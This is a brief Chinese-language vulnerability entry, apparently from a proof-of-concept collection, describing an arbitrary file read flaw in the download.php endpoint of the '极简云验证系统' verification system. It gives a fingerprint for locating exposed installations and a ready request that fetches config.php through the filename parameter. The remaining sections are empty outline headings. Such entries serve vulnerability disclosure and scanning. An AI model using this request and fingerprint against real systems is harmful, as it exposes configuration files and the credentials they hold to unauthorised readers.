# 极简云验证系统download存在任意文件读取漏洞

- **系统**：极简云验证系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="/js/lib/slimscroll.js"`
- **请求**：`GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1`
- **关键头**：`Content-Length: 0`

**请求体 / payload**
```

```

**其他**
- 极简云验证系统download存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 极简云验证系统